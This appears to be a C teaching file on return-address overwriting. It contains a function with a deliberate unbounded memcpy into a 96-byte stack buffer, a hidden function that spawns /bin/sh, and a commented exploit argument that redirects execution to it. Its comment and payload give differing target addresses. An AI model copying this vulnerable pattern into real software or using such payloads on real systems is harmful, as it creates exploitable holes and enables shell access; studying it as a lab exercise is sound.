/**
 * Author: Nalam V S S Krishna Chaitanya,
 * Details: CS13B021, IIT Madras.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * This file is to demonstrate how to change return address of the function by
 * overflowing the buffer. In this file we have a function 'not_called' which is
 * not called in any function however we write the address of the function as
 * return address of the vulnerable_function there by returning to it from the
 * vulnerable_function.
 */

void not_called()
{
	printf("Enjoy Your Shell\n");
	system("/bin/sh");				// executes a shell.
	exit(0);
}

/**
 * This function is the vulnerable function which has a buffer and does the
 * memory operations without bound checking. The argument has to be 112 bytes
 * long as 96 bytes to cover the buffer and 8 bytes to cover the frame pointer
 * and the next 8 bytes should be the return address which is the address of the
 * function not_called (0x40602d) so that the vulnerable_function returns to
 * not_called then executes the shell.
 */

void vulnerable_function(char *string)
{
	char buffer[96];					// buffer to be overflowed.
	memcpy(buffer,string,96+8+8);		// copying the argument.
	memset(buffer+107,0,5);				// restoring NULL bytes.
}

// Argument to be given.
// "$(python -c 'print "A"*96+"B"*8+"\x6d\x06\x40\x20\x20\x20\x20\x20"')"

int main(int argc,char **argv)
{
	vulnerable_function(argv[1]);
	return 0;
}
